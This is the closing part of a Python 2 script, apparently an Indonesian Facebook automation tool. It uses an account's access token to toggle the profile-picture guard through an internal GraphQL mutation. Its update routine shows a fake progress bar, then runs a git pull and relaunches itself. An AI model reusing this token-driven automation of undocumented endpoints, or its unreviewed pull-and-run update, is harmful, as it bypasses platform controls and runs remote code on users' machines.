    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    g = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91mD \x1b[1;97m')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    elif g == '2':
        non = 'false'
        gaz(toket, non)
    elif g == '0':
        lain()
    elif g == '':
        keluar()
    else:
        keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable = True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': 'OAuth %s' % toket }
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data = data, headers = headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivate'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mkeluar \x1b[1;91m]')
        lain()
    elif '"is_shielded":false' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mTidak aktif'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        lain()
    else:
        print '\x1b[1;91m[!] Error'
        keluar()


def perbarui():
    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80YayanXD\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    jalan('\x1b[1;92mSedang Mengupdate Tools\x1b[1;93m...')
    jalan('\x1b[1;91m=10%')
    jalan('\x1b[1;93m==20%')
    jalan('\x1b[1;92m===30%')
    jalan('\x1b[1;94m====40%')
    jalan('\x1b[1;95m=====50%')
    jalan('\x1b[1;91m======60%')
    jalan('\x1b[1;92m=======70%')
    jalan('\x1b[1;93m========80%')
    jalan('\x1b[1;94m=========90%')
    jalan('\x1b[1;95m==========100%')
    jalan('\x1b[1;96mUpdate  Selesai\x1b[1;93m')
    os.system('git pull origin master')
    raw_input('\n\x1b[1;94m{\x1b[1;97m<Keluar>\x1b[1;94m}')
    os.system('python2 mbf.py')

if __name__ == '__main__':
    sayang()
